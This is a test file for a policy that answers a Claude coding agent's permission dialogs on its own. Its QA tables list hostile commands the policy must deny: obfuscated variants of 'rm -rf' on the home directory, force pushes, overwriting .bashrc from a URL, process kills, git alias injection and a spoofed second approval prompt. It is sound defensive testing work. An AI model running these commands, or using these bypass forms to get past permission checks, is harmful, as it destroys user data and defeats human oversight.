import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync } from 'node:fs'
import { join } from 'node:path'
import { commandRule, decideNoqAnswer, fileRule, noqDialogKey, parseNoqDialog, shouldAnswer, type NoqDialog, type NoqFs } from './noq-policy'
import { createNoqRunner, type NoqAnswerRecord } from './noq-runner'
import type { SessionSnapshot } from './sessions-host'

const HOME = '/home/u'
const CWD = '/home/u/agentistics/.worktrees/wt'
/** Every path is itself (no links) except git metadata, which does not exist; the cwd is a linked worktree on `mybranch`. */
const FS: NoqFs = {
  realpath: p => (/(^|\/)(\.git|\.worktrees|\.claude\/worktrees)$/.test(p) ? null : p),
  isSymlink: () => false,
  branch: () => 'mybranch',
  repo: () => ({ kind: 'linked', worktrees: [CWD] }),
}
const ENV = { home: HOME, fs: FS }
const OPTIONS = [
  { number: 1, label: 'Yes', selected: true },
  { number: 2, label: 'Yes, and always allow (shift+tab)', selected: false },
  { number: 3, label: 'No, and tell Claude what to do differently (esc)', selected: false },
]
/** The QA probes' shape: the command indented under the header, no description, no options drawn. */
const screen = (cmd: string) => ['Bash command', ...cmd.split('\n').map(l => `  ${l}`), 'Do you want to proceed?']
const dialog = (cmd: string, over: Partial<NoqDialog> = {}): NoqDialog => ({
  harness: 'claude', mode: 'no-questions', cwd: CWD, approvalLines: screen(cmd), dialogOptions: OPTIONS, ...over,
})
const fileDialog = (verb: string, path: string, leaf: string, over: Partial<NoqDialog> = {}): NoqDialog => ({
  harness: 'claude', mode: 'no-questions', cwd: CWD, dialogOptions: OPTIONS,
  approvalLines: [`│ ${verb} │`, `│  ${path} │`, '│  1 +hello │', `│ Do you want to make this edit to ${leaf}? │`], ...over,
})
const act = (cmd: string): string => {
  const d = decideNoqAnswer(dialog(cmd), ENV)
  return d.action === 'skip' ? `skip:${d.why}` : d.action
}

/*
 * Every QA case of r1/r2 (75) and the r3 hunt (40), /home/mithrandir → /home/u, the QA worktree → CWD.
 * The finding id names the r3 blocker a row reproduces; each was APPROVED by r3.
 */
type Case = [cmd: string, expect: 'approve' | 'deny', finding?: string]
const QA: Case[] = [
  // r1/r2 · rm
  ['rm -rf /home/u', 'deny'], ['rm -fr /home/u', 'deny'], ['rm -r -f /home/u', 'deny'], ['rm --recursive /home/u', 'deny'],
  ['/bin/rm -r /home/u', 'deny'], ['\\rm -r /home/u', 'deny'], ['r\\m -r /home/u', 'deny'], ['"r"m -r /home/u', 'deny'],
  ['command rm -r /home/u', 'deny'], ['sudo rm -r /home/u', 'deny'], ['xargs rm -rf', 'deny'], ['ls | xargs rm -rf', 'deny'],
  ['find /home/u -delete', 'deny'], ['find / -exec rm -rf {} +', 'deny'], ['rm -r "/home/u"', 'deny'], ['rm -r ~', 'deny'],
  ['rm -r $HOME', 'deny'], ['rm -r /tmp/x ; rm -r /home/u', 'deny'], ['bash -c "rm -r /home/u"', 'deny'], ['(rm -r /home/u)', 'deny'],
  ['echo ok\nrm -r /home/u', 'deny'], ['rm -r /tmp/*', 'deny'], ['rm -rf /tmp/../home', 'deny'], ['rm -r /tmp/{..,}', 'deny'],
  ['cd / && rm -rf usr', 'deny'], ['cd /home/u && rm -rf .', 'deny'], ['rm -rf /tmp/x && echo ok', 'deny'],
  ['rm -rf ./build', 'approve'], ['rm -r /tmp/qnoq-scratch', 'approve'],
  // r1/r2 · push
  ['git push -f origin HEAD:main', 'deny'], ['git push --force origin main', 'deny'], ['git push --force-with-lease origin main', 'deny'],
  ['git push origin +main', 'deny'], ['git push origin HEAD:refs/heads/main --force', 'deny'], ['git -C /home/u/agentistics push --force', 'deny'],
  ['git -C /home/u/agentistics push -f origin main', 'deny'], ['git push -f origin', 'deny'], ['git push -fu origin HEAD:main', 'deny'],
  ['git push -uf origin main', 'deny'], ['git push -f origin HEAD', 'deny'], ['git push origin :main', 'deny'],
  ['git push origin mybranch', 'approve'], ['git push -f origin fix/own-branch', 'deny'],
  // r1/r2 · ports, upgrade, kill
  ['curl http://localhost:47291/api/fleet', 'deny'], ['curl localhost:47292', 'deny'], ['fuser -k 47291/tcp', 'deny'], ['PORT=47291 bun run x', 'deny'],
  ['agentop upgrade', 'deny'], ['agentop  upgrade', 'deny'], ['/usr/local/bin/agentop upgrade', 'deny'], ['npx agentop@latest upgrade', 'deny'],
  ['agentop "upgrade"', 'deny'], ['pkill -f some-process', 'deny'], ['killall bun', 'deny'], ['sudo pkill agentop', 'deny'],
  ['/usr/bin/pkill -f agentop', 'deny'], ['kill $(pgrep -f agentop)', 'deny'], ['kill -9 $(pidof bun)', 'deny'],
  // r1/r2 · the store
  ['echo x > ~/.agentistics/registry.json', 'deny'], ['tee /home/u/.agentistics/x', 'deny'], ['cp a $HOME/.agentistics/x', 'deny'],
  ['sed -i s/a/b/ ~/.agentistics/managed-sessions.json', 'deny'], ['cd ~/.agentistics && echo x > registry.json', 'deny'],
  ['cd ~/.agentistics && rm -f managed-sessions.json', 'deny'], ["python3 -c \"open('/home/u/.agentistics/x','w')\"", 'deny'],
  ['curl -o ~/.agentistics/x http://example.com/a', 'deny'], ['unzip a.zip -d ~/.agentistics', 'deny'],
  // r3 hunt
  ['ｒm -rf /home/u', 'deny'], ['r​m -rf /home/u', 'deny'], ['rm\t-rf\t/home/u', 'deny'], ['rm -rf /home/u\r', 'deny'],
  ['git -c alias.x=!rm\\ -rf\\ /home/u x', 'deny'], ["git -c alias.x='!rm -rf /home/u' x", 'deny'], ['git -c core.sshCommand=evil fetch', 'deny'],
  ['git --exec-path=/tmp/evil status', 'deny', 'B9'], ['git -C /home/u/agentistics clean -fdx', 'deny', 'B8'],
  ['git -C /home/u/agentistics reset --hard', 'deny', 'B8'], ['git reset --hard', 'deny', 'H3'], ['git checkout -- .', 'deny', 'H3'],
  ['git clean -fdx', 'deny', 'H3'], ['git worktree remove --force /tmp/x', 'deny'], ['git push origin --delete feature-x', 'deny', 'H5'],
  ['npx rimraf /home/u', 'deny', 'B9'], ['bunx rimraf /home/u', 'deny', 'B9'], ['make -f /tmp/evil.mk', 'deny', 'B9'],
  ['npm run anything', 'deny', 'B9'], ['python3 x.py', 'deny', 'B9'], ['bash x.sh', 'deny', 'B9'],
  ['watch -n1 rm -rf /home/u', 'deny', 'B7'], ['taskset -c 0 rm -rf /home/u', 'deny', 'B7'], ['strace -o /tmp/s rm -rf /home/u', 'deny', 'B7'],
  ['script -qc "rm -rf /home/u" /dev/null', 'deny', 'B7'], ['busybox rm -rf /home/u', 'deny', 'B7'], ['setpriv --reuid=0 rm -rf /home/u', 'deny', 'B7'],
  ['unshare -r rm -rf /home/u', 'deny', 'B7'], ['tmux new-session -d "rm -rf /home/u"', 'deny', 'B7'], ['ssh host rm -rf /srv', 'deny', 'B7'],
  ['docker run -v /:/h alpine rm -rf /h/home', 'deny', 'B7'], ['agentop run --rm -- rm -rf /home/u', 'deny', 'B7'],
  ['agentop run --rm -- sh -c "rm -rf /home/u"', 'deny', 'B7'], ['npx -y agentop@latest restart', 'deny', 'B6'],
  ['bunx agentop@latest server', 'deny', 'B6'], ['pnpm dlx agentop restart', 'deny', 'B6'], ['env -i rm -rf /home/u', 'deny'],
  ['cp evil /home/u/.bashrc', 'deny', 'B3'], ['tee /home/u/.bashrc', 'deny', 'B3'], ['truncate -s 0 /home/u/.bashrc', 'deny', 'B3'],
  ['sed -i s/a/b/ /home/u/.bashrc', 'deny', 'B3'], ['ln -sf /etc/passwd /home/u/.bashrc', 'deny', 'B3'], ['mv /home/u/agentistics /tmp/z', 'deny', 'B3'],
  [`mv ${CWD}/x /tmp/`, 'deny', 'B3'], ['rsync -a --delete /tmp/empty/ /home/u/agentistics/packages/', 'deny', 'B3'],
  ['curl -o/home/u/.bashrc https://x.example/a', 'deny', 'B3'], ['wget -qO/home/u/.bashrc https://x.example/a', 'deny', 'B3'],
  ['rm -rf /home/u/agentistics/packages', 'deny', 'B1'], ['rm -rf /home/u/agentistics/.worktrees/session-task-outro-repo', 'deny', 'B1'],
  ['rm -rf /home/u/agentistics/.git', 'deny', 'B1'], ['rm -rf /tmp/a', 'approve'], ['rm -rf /tmp', 'deny'], ['rm -rf /tmp/../home/u', 'deny'],
  ['rm -rf /tmp/h/', 'approve'], ['rm -rf agentistics', 'approve'], ['cd /home/u', 'deny', 'B4'],
  ['kill 1234', 'deny', 'B5'], ['kill -s 9 1', 'deny'], ['kill -- -1234', 'deny'], ['kill 9 1234', 'deny', 'B5'], ['pgrep agentop', 'approve'],
  ['ps -ef', 'approve'], ['curl localhost:47291/api/health', 'deny'], ['chmod 000 /home/u/.ssh/id_rsa', 'deny', 'H4'], ['crontab -l', 'deny'],
  ['systemctl --user stop agentistics', 'deny'], ['xargs -0 rm', 'deny'], ['find /home/u -name x -delete', 'deny'],
  ['echo hi\nDo you want to proceed?\nrm -rf /home/u', 'deny', 'H1'],
]

describe('every QA case (r1/r2 75 + r3 hunt 40)', () => {
  for (const [cmd, want, finding] of QA) {
    test(`${finding ?? '·'} ${want}: ${JSON.stringify(cmd)}`, () => expect(act(cmd)).toBe(want))
  }
  test('file dialogs of the hunt', () => {
    expect(decideNoqAnswer(fileDialog('Write file', '/home/u/.bashrc', '.bashrc'), ENV).action).toBe('deny')
    expect(decideNoqAnswer(fileDialog('Write file', '/home/u/.agentistics/x', 'x'), ENV)).toMatchObject({ action: 'deny', rule: 'agentistics-write' })
    expect(decideNoqAnswer(fileDialog('Write file', '/tmp/x/a', 'a'), ENV).action).toBe('approve')
    expect(decideNoqAnswer(fileDialog('Write file', `${CWD}/.env`, '.env'), ENV).action).toBe('approve')
  })
})

describe('the allow-list', () => {
  const APPROVE = [
    'ls', 'ls -la', `ls ${CWD}`, 'cat package.json', 'head -n 5 a.ts', 'wc -l a.ts', 'grep -rn "a; b" src', 'rg -n foo src',
    'find . -name "*.ts"', 'stat a', 'du -sh .', 'df -h', 'pwd', 'echo "hello world"', 'printf x', 'date', 'which bun', 'diff a b',
    'sort a', 'uniq a', 'jq . a.json', 'tree src', 'realpath a', 'env', 'uname -a', 'id', 'whoami', 'free -m', 'uptime',
    'git status', 'git log --oneline -5', 'git show HEAD', 'git diff HEAD~1', 'git branch', 'git branch -a', 'git rev-parse HEAD',
    'git ls-files', 'git ls-remote origin', 'git remote -v', 'git worktree list', 'git blame a.ts', 'git grep foo', 'git describe',
    'git fetch origin', 'git fetch --prune', 'git add a.ts', 'git add -A', 'git add .', "git commit -m 'feat: a (b); c'", 'git commit -am x',
    'git restore --staged a.ts', 'git switch -c feat/x', 'git checkout -b feat/x', 'git stash push -m wip', 'git stash list',
    'git push origin mybranch', 'git push -u origin mybranch',
    'gh pr view 12', 'gh pr list', 'gh pr diff 12', 'gh pr checks 12', 'gh run view 1', 'gh run list', 'gh release list',
    'gh api repos/o/r/pulls', 'agentop --version', 'agentop --help', 'agentop status', 'agentop session list',
    'agentop run --rm -- bun test packages/a.test.ts', `agentop run --rm -- bun test ${CWD}/packages`,
    'mkdir -p dist/x', 'touch a.txt', 'cp a b', 'cp -r src /tmp/x/src', 'mv a b', 'rm a', `rm -rf ${CWD}/dist`, 'rmdir /tmp/x/y',
    'ln -s a b', 'ln -s /tmp/x/a /tmp/x/b',
  ]
  const DENY: Array<[string, string]> = [
    ['cd src', 'cd'], ['pushd src', 'cd'], ['ls; ls', 'not-simple'], ['ls && ls', 'not-simple'], ['ls | cat', 'not-simple'],
    ['ls > x', 'not-simple'], ['ls *.ts', 'not-simple'], ['echo $HOME', 'not-simple'], ['FOO=1 ls', 'not-simple'],
    ['kill 1234', 'kill'], ['pkill x', 'kill'], ['python3 a.py', 'interpreter'], ['node a.js', 'interpreter'], ['bun test a.test.ts', 'interpreter'],
    ['bun run build', 'interpreter'], ['awk 1 a', 'interpreter'], ['npx tsc', 'runner'], ['make', 'runner'], ['npm run x', 'runner'],
    ['timeout 5 ls', 'wrapper'], ['nohup ls', 'wrapper'], ['env FOO=1 ls', 'wrapper'], ['xargs ls', 'wrapper'], ['flock /tmp/l ls', 'wrapper'],
    ['exec ls', 'wrapper'], ['command -v node', 'wrapper'], ['/bin/ls', 'not-allowed'], ['"ls"', 'not-allowed'], ['sed -n 1p a', 'not-allowed'],
    ['curl https://x', 'not-allowed'], ['wget https://x', 'not-allowed'], ['chmod +x a', 'not-allowed'], ['tee a', 'not-allowed'],
    ['dd if=a of=b', 'not-allowed'], ['rsync a b', 'not-allowed'], ['tar -xf a.tar', 'not-allowed'], ['vim a', 'not-allowed'],
    ['sort -o a b', 'not-allowed'], ['sort --output=a b', 'not-allowed'], ['tree -o a', 'not-allowed'], ['rg --pre x foo', 'not-allowed'],
    ['find . -fprint a', 'not-allowed'], ['find . -execdir ls ;', 'not-simple'], ['date -s 2020-01-01', 'not-allowed'], ['uniq a b', 'not-allowed'],
    ['cat /home/u/.agentistics/vault.sealed', 'agentistics-write'],
    ['git -C . status', 'git'], ['git --no-pager log', 'git'], ['git diff --output=/home/u/x', 'git'], ['git log --ext-diff', 'git'],
    ['git grep -O foo', 'git'], ['git fetch --upload-pack=x origin', 'git'], ['git branch -D x', 'git'], ['git branch new', 'git'],
    ['git remote add x y', 'git'], ['git worktree add /tmp/x', 'git'], ['git commit --amend -m x', 'git'], ['git commit -n -m x', 'git'],
    ['git commit --no-verify -m x', 'git'], ['git commit', 'git'], ['git restore a.ts', 'git'], ['git restore --staged --worktree a', 'git'],
    ['git restore --staged /home/u/x', 'write-outside'], ['git add /home/u/x', 'write-outside'], ['git switch main', 'git'],
    ['git checkout main', 'git'], ['git stash pop', 'git'], ['git stash drop', 'git'], ['git rebase main', 'git'], ['git merge x', 'git'],
    ['git push', 'push'], ['git push origin', 'push'], ['git push origin main', 'push'], ['git push origin other', 'push'],
    ['git push origin mybranch:main', 'push'], ['git push --force origin mybranch', 'push'],
    ['gh pr create', 'not-allowed'], ['gh pr merge 1', 'not-allowed'], ['gh api -X POST repos/o/r/issues', 'not-allowed'],
    ['gh api repos/o/r -f a=b', 'not-allowed'], ['gh api --method=DELETE x', 'not-allowed'], ['gh repo delete x', 'not-allowed'],
    ['agentop session attach x', 'agentop'], ['agentop server', 'agentop'], ['agentop restart', 'agentop'], ['agentop run --rm -- bun run x', 'agentop'],
    ['agentop run -- bun test a.test.ts', 'agentop'], ['agentop run --rm -- bun test --timeout 1 a', 'agentop'],
    ['agentop run --rm -- bun test /home/u/other/a.test.ts', 'agentop'], ['agentop run --rm -- bun test ../a', 'agentop'],
    [`rm -rf ${CWD}`, 'write-outside'], ['rm -rf .', 'write-outside'], ['rm -rf /home/u/agentistics', 'write-outside'],
    ['rm -rf /home/u/agentistics/.worktrees', 'write-outside'], ['rm -rf /tmp/tmux-1000', 'write-outside'], ['rm -rf /tmp/.X11-unix', 'write-outside'],
    ['rm -rf /tmp/agentistics-heavy.lock', 'write-outside'], ['rm -rf ../x', 'write-outside'], ['rm', 'write-outside'],
    ['rm --no-preserve-root -rf x', 'not-allowed'], ['rmdir -p a/b', 'not-allowed'], ['cp -l /home/u/.bashrc x', 'not-allowed'],
    ['cp -s /home/u/.bashrc x', 'not-allowed'], ['cp /home/u/.ssh/id_rsa x', 'write-outside'], ['cp -t /home/u a', 'not-allowed'],
    ['mv a /home/u/x', 'write-outside'], ['touch /home/u/x', 'write-outside'], ['mkdir /home/u/x', 'write-outside'],
    ['ln a /home/u/x', 'write-outside'], ['ln /home/u/.bashrc x', 'write-outside'], ['ln -s ../../.. x', 'write-outside'],
    ['ln -s /etc x', 'write-outside'], ['ln -s a', 'write-outside'], ['touch /home/u/.agentistics/x', 'agentistics-write'],
    ['echo 47292', 'agentistics-port'],
  ]
  for (const c of APPROVE) test(`approve: ${JSON.stringify(c)}`, () => expect(act(c)).toBe('approve'))
  for (const [c, rule] of DENY) {
    test(`deny ${rule}: ${JSON.stringify(c)}`, () => expect(decideNoqAnswer(dialog(c), ENV)).toMatchObject({ action: 'deny', rule }))
  }
  test('push needs the branch to be read: unknown branch → refused', () => {
    expect(commandRule('git push origin mybranch', CWD, HOME, { ...FS, branch: () => null })?.rule).toBe('push')
    expect(commandRule('git push origin main', CWD, HOME, { ...FS, branch: () => 'main' })?.rule).toBe('push')
  })
  test('a refusal carries a typed reason and picks the No option; approve picks the plain Yes', () => {
    const cd = decideNoqAnswer(dialog('cd x && ls'), ENV)
    expect(cd).toMatchObject({ action: 'deny', choice: 3, rule: 'cd' })
    expect(cd.action !== 'skip' && cd.reason).toContain('absolute paths inside your worktree')
    expect(decideNoqAnswer(dialog('ls'), ENV)).toMatchObject({ action: 'approve', choice: 1 })
  })
  test('AGENTISTICS_HOME is protected like ~/.agentistics', () => {
    const prev = process.env.AGENTISTICS_HOME
    process.env.AGENTISTICS_HOME = '/srv/agx'
    try { expect(commandRule('touch /srv/agx/a', CWD, HOME, FS)?.rule).toBe('agentistics-write') } finally {
      if (prev === undefined) delete process.env.AGENTISTICS_HOME; else process.env.AGENTISTICS_HOME = prev
    }
  })
})

describe('the path rule follows symlinks on the real disk (B2)', () => {
  let root = ''
  let outside = ''
  let wt = ''
  beforeAll(() => {
    root = mkdtempSync('/tmp/noq-b2-')
    outside = '/usr/share' // outside both the worktree and /tmp; only ever read
    wt = join(root, 'wt')
    mkdirSync(join(wt, 'src'), { recursive: true })
    symlinkSync(outside, join(root, 'h'))
    symlinkSync(outside, join(wt, 'escape'))
    symlinkSync(join(root, 'gone'), join(root, 'dangling'))
  })
  afterAll(() => { rmSync(root, { recursive: true, force: true }) })
  const disk = (cmd: string) => commandRule(cmd, wt, '/nonexistent-home')?.rule ?? 'approve'
  test('rm through a /tmp symlink to outside → refused, with and without a trailing slash', () => {
    expect(disk(`rm -rf ${root}/h/`)).toBe('write-outside')
    expect(disk(`rm -rf ${root}/h`)).toBe('write-outside')
    expect(disk(`rm -rf ${root}/h/x`)).toBe('write-outside')
  })
  test('a link inside the worktree leading out is refused; a plain file inside is fine', () => {
    expect(disk('rm -rf escape/')).toBe('write-outside')
    expect(disk('touch escape/a')).toBe('write-outside')
    expect(disk('touch src/a')).toBe('approve')
    expect(fileRule(`${wt}/escape/a.ts`, wt, '/nonexistent-home')?.rule).toBe('write-outside')
  })
  test('a dangling link is refused (a write would land wherever it points)', () => {
    expect(disk(`touch ${root}/dangling`)).toBe('write-outside')
  })
  test('ln: making a link that leads out is refused', () => {
    expect(disk(`ln -s ${outside} ${root}/new`)).toBe('write-outside')
  })
  test('the worktree and its ancestors are never a target, even under /tmp', () => {
    expect(disk(`rm -rf ${wt}`)).toBe('write-outside')
    expect(disk(`rm -rf ${root}`)).toBe('write-outside')
  })
})

describe('the dialog, read off a REAL claude 2.1.326 frame (fixtures/noq-claude-2.1.326)', () => {
  const fx = (n: string) => readFileSync(join(import.meta.dir, 'fixtures/noq-claude-2.1.326', n), 'utf8').split('\n')
  const real = (n: string, cwd = '/tmp/noq-r4-probe') => decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd, frame: fx(n) }, ENV)
  test('the description sits above the rules and is NOT judged (H2): `ls -la` + description → 1', () => {
    expect(parseNoqDialog(fx('ls-la-ansi.txt'))).toMatchObject({ kind: 'bash', command: 'ls -la' })
    expect(real('ls-la-ansi.txt')).toMatchObject({ action: 'approve', choice: 1, command: 'ls -la' })
  })
  test('`touch marker.txt` inside the cwd → approve (plain and ANSI agree); the "No" is option 4', () => {
    expect(real('touch-ansi.txt')).toMatchObject({ action: 'approve', choice: 1, command: 'touch marker.txt' })
    expect(real('touch-plain.txt')).toMatchObject({ action: 'approve', choice: 1 })
    const outside = fx('touch-ansi.txt').map(l => l.replace('touch marker.txt', 'touch /home/u/x'))
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: '/tmp/noq-r4-probe', frame: outside }, ENV)).toMatchObject({ action: 'deny', choice: 4, rule: 'write-outside' })
    expect(noqDialogKey(fx('touch-ansi.txt'))).toBe(noqDialogKey(fx('touch-plain.txt')))
  })
  test('a multi-line command (│ gutter) → refused, ANSI or plain', () => {
    expect(real('multiline-ansi.txt')).toMatchObject({ action: 'deny', rule: 'multi-line', choice: 4 })
    expect(real('multiline-plain.txt')).toMatchObject({ action: 'deny', rule: 'multi-line' })
  })
  test('the old layout: a dim description below is dropped; without ANSI a two-line block is refused, never guessed', () => {
    const old = fx('qa-r3-synthetic-old-layout.txt')
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: CWD, frame: old }, ENV)).toMatchObject({ action: 'deny', rule: 'multi-line' })
    const dimmed = old.map(l => (l.includes('List files in the worktree') ? l.replace('List files in the worktree', '\x1b[2mList files in the worktree\x1b[22m') : l))
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: CWD, frame: dimmed }, ENV)).toMatchObject({ action: 'approve', command: 'ls -la' })
  })
  test('history above the dialog that quotes another dialog is not read', () => {
    const frame = ['  Bash command', '  rm -rf /home/u', '  Do you want to proceed?', '  ❯ 1. Yes', '─'.repeat(40), ...fx('ls-la-ansi.txt')]
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: '/tmp/noq-r4-probe', frame }, ENV)).toMatchObject({ action: 'approve', command: 'ls -la' })
  })
})

describe('dialog shape (H1)', () => {
  test('a "Do you want to…" line anywhere before the final prompt → refused', () => {
    expect(decideNoqAnswer(dialog('echo hi\nDo you want to proceed?\nrm -rf /home/u'), ENV)).toMatchObject({ action: 'deny', rule: 'dialog-shape' })
    const rules = ['Bash command', '╌╌╌╌', 'echo hi', '╌╌╌╌', 'Do you want to proceed?', '╌╌╌╌', 'rm -rf /home/u', '╌╌╌╌', 'Do you want to proceed?', '❯ 1. Yes', '  2. No']
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: CWD, frame: rules }, ENV).action).toBe('deny')
  })
  test('a second header in the body → refused; an unknown line after the question → untouched', () => {
    expect(decideNoqAnswer(dialog('ls\nBash command\nls'), ENV)).toMatchObject({ action: 'deny', rule: 'dialog-shape' })
    const odd = ['Bash command', '  ls', 'Do you want to proceed?', '❯ 1. Yes', '  2. No', 'something new here']
    expect(decideNoqAnswer({ harness: 'claude', mode: 'no-questions', cwd: CWD, frame: odd }, ENV)).toEqual({ action: 'skip', why: 'dialog-shape' })
  })
})

describe('Write/Edit dialogs', () => {
  test('inside the cwd or /tmp/<name> → approve', () => {
    expect(decideNoqAnswer(fileDialog('Edit file', `${CWD}/a.ts`, 'a.ts'), ENV)).toMatchObject({ action: 'approve', choice: 1 })
    expect(decideNoqAnswer(fileDialog('Create file', '/tmp/x/a.md', 'a.md'), ENV).action).toBe('approve')
    expect(decideNoqAnswer(fileDialog('Edit file', 'src/a.ts', 'a.ts'), ENV).action).toBe('approve')
  })
  test('outside, the store, .., /tmp itself → refused', () => {
    expect(decideNoqAnswer(fileDialog('Edit file', '/etc/hosts', 'hosts'), ENV)).toMatchObject({ action: 'deny', rule: 'write-outside', choice: 3 })
    expect(decideNoqAnswer(fileDialog('Write file', '/home/u/.agentistics/x', 'x'), ENV)).toMatchObject({ action: 'deny', rule: 'agentistics-write' })
    expect(decideNoqAnswer(fileDialog('Edit file', `${CWD}/../../x`, 'x'), ENV).action).toBe('deny')
    expect(fileRule('/home/u/agentistics-workspace/r.md', CWD, HOME, FS)?.rule).toBe('write-outside')
  })
  test('a truncated path (leaf does not match the question) is left to the person', () => {
    expect(decideNoqAnswer(fileDialog('Edit file', `${CWD}/packages/long/pa`, 'a.ts'), ENV).action).toBe('skip')
  })
  test('trust-folder, plan and choice menus stay untouched', () => {
    const base = { harness: 'claude', mode: 'no-questions', cwd: CWD }
    expect(decideNoqAnswer({ ...base, approvalLines: ['Do you trust the files in this folder?'], dialogOptions: [{ number: 1, label: 'Yes, proceed' }, { number: 2, label: 'No, exit' }] }, ENV).action).toBe('skip')
    expect(decideNoqAnswer({ ...base, approvalLines: ['Would you like to proceed?'], dialogOptions: [{ number: 1, label: 'Yes, and auto-accept edits' }, { number: 2, label: 'No, keep planning' }] }, ENV).action).toBe('skip')
    expect(decideNoqAnswer({ ...base, approvalLines: ['Deploy to prod?'], dialogOptions: [{ number: 1, label: 'Yes' }, { number: 2, label: 'No' }] }, ENV).action).toBe('skip')
  })
})

describe('scope: mode and harness', () => {
  test('another mode, harness, no mode, non Yes/No → skip', () => {
    for (const over of [{ mode: 'default' }, { mode: 'accept-edits' }, { mode: 'plan' }, { mode: undefined }, { harness: 'codex' }]) {
      expect(decideNoqAnswer(dialog('rm -rf /home/u', over), ENV).action).toBe('skip')
    }
    expect(decideNoqAnswer(dialog('ls', { dialogOptions: [{ number: 1, label: 'Apple' }, { number: 2, label: 'Pear' }] }), ENV).action).toBe('skip')
  })
})

describe('shouldAnswer', () => {
  test('a new frame is answered; the same one again only after the repeat (ok) or retry (failed) window', () => {
    const mem = { lastKey: new Map() }
    expect(shouldAnswer(mem, 's', 'A', 0)).toBe(true)
    mem.lastKey.get('s')!.ok = true
    expect(shouldAnswer(mem, 's', 'A', 5_000)).toBe(false)
    expect(shouldAnswer(mem, 's', 'A', 10_000)).toBe(true) // M2: still there → answered again
    expect(shouldAnswer(mem, 's', 'B', 11_000)).toBe(true)
    expect(shouldAnswer(mem, 's', 'B', 20_000)).toBe(false)
    expect(shouldAnswer(mem, 's', 'B', 26_000)).toBe(true)
  })
})

function snap(rows: Array<Record<string, unknown> & { id: string }>): SessionSnapshot {
  return { sessions: rows.map(r => ({ cwd: CWD, harness: 'claude', activity: 'waiting-approval', status: 'running', ...r })), attention: 0, rang: [], polledAtMs: 0 } as unknown as SessionSnapshot
}
const row = (id: string, cmd: string, canonical = 'no-questions') => ({
  id, mode: canonical !== 'none' ? { id: 'bypass', label: 'bypass', canonical: canonical as 'no-questions' } : undefined, approvalLines: screen(cmd), dialogOptions: OPTIONS,
})
const idleRow = (id: string, canonical = 'no-questions') => ({ id, activity: 'working', mode: { id: 'x', label: 'x', canonical: canonical as 'no-questions' } })

describe('runner', () => {
  function harness(extra: Record<string, unknown> = {}) {
    const sent: Array<[string, number]> = []
    const keys: string[] = []
    const prompts: Array<[string, string]> = []
    const records: NoqAnswerRecord[] = []
    const logs: string[] = []
    let now = 0
    const runner = createNoqRunner({
      answer: async (id, c, key) => { sent.push([id, c]); keys.push(key); return { ok: true, message: 'ok' } },
      prompt: async (id, t) => { prompts.push([id, t]); return { ok: true, message: 'ok' } },
      record: r => { records.push(r) },
      log: m => { logs.push(m) },
      now: () => now,
      home: HOME,
      ...extra,
    })
    return { sent, keys, prompts, records, logs, runner, at: (n: number) => { now = n } }
  }

  test('approves an allowed command and records it; the host is handed the dialog identity', async () => {
    const h = harness()
    await h.runner.consume(snap([row('s1', 'ls -la')]))
    expect(h.sent).toEqual([['s1', 1]])
    expect(h.keys[0]).toBe(noqDialogKey(screen('ls -la')))
    expect(h.records[0]).toMatchObject({ decision: 'approve', id: 's1', ok: true })
  })
  test('refuses, and types the reason only on a LATER poll once the dialog is gone', async () => {
    const h = harness()
    await h.runner.consume(snap([row('s1', 'cd x && ls')]))
    expect(h.sent).toEqual([['s1', 3]])
    expect(h.prompts).toEqual([])
    await h.runner.consume(snap([row('s1', 'cd x && ls')]))
    expect(h.prompts).toEqual([])
    await h.runner.consume(snap([idleRow('s1')]))
    expect(h.prompts).toHaveLength(1)
    expect(h.prompts[0]![1]).toContain('do not cd')
  })
  test('M1: the frame is captured fresh, and a dialog that changed before the keystroke is re-judged', async () => {
    const frames = [screen('ls'), screen('rm -rf /home/u')]
    let n = 0
    const answers: Array<[number, string]> = []
    const h = harness({
      capture: async () => frames[Math.min(n, 1)],
      answer: async (_id: string, c: number, key: string) => {
        answers.push([c, key])
        // The host read the pane and found a different dialog than the one judged: nothing typed.
        if (n++ === 0) return { ok: false, message: 'gone', stale: true }
        return { ok: true, message: 'ok' }
      },
    })
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(answers).toEqual([[1, noqDialogKey(screen('ls'))], [3, noqDialogKey(screen('rm -rf /home/u'))]])
    expect(h.records).toHaveLength(1)
    expect(h.records[0]).toMatchObject({ decision: 'deny', command: 'rm -rf /home/u' })
  })
  test('M1: the decision uses the fresh capture, not the snapshot lines', async () => {
    const h = harness({ capture: async () => screen('rm -rf /home/u') })
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.sent).toEqual([['s1', 3]])
  })
  test('M2: an identical dialog still on screen with no non-dialog poll between is answered again after the window', async () => {
    const h = harness()
    await h.runner.consume(snap([row('s1', 'ls')]))
    h.at(5_000)
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.sent).toHaveLength(1)
    h.at(10_000)
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.sent).toHaveLength(2)
  })
  test('the same command twice with the dialog gone between is answered twice', async () => {
    const h = harness()
    await h.runner.consume(snap([row('s1', 'ls')]))
    await h.runner.consume(snap([idleRow('s1')]))
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.sent.length).toBe(2)
  })
  test('a failed answer is retried after the retry window, not before', async () => {
    let ok = false
    const h = harness({ answer: async () => ({ ok, message: 'x' }) })
    await h.runner.consume(snap([row('s1', 'ls')]))
    h.at(5_000)
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.records).toHaveLength(1)
    ok = true
    h.at(20_000)
    await h.runner.consume(snap([row('s1', 'ls')]))
    expect(h.records).toHaveLength(2)
  })
  test('a registered START mode alone does not answer (logged once)', async () => {
    const h = harness({ startMode: async () => 'no-questions' })
    await h.runner.consume(snap([row('s1', 'ls', 'none')]))
    await h.runner.consume(snap([row('s1', 'pwd', 'none')]))
    expect(h.sent).toEqual([])
    expect(h.logs).toHaveLength(1)
  })
  test('the registry CURRENT mode answers when the chip is hidden; default does not', async () => {
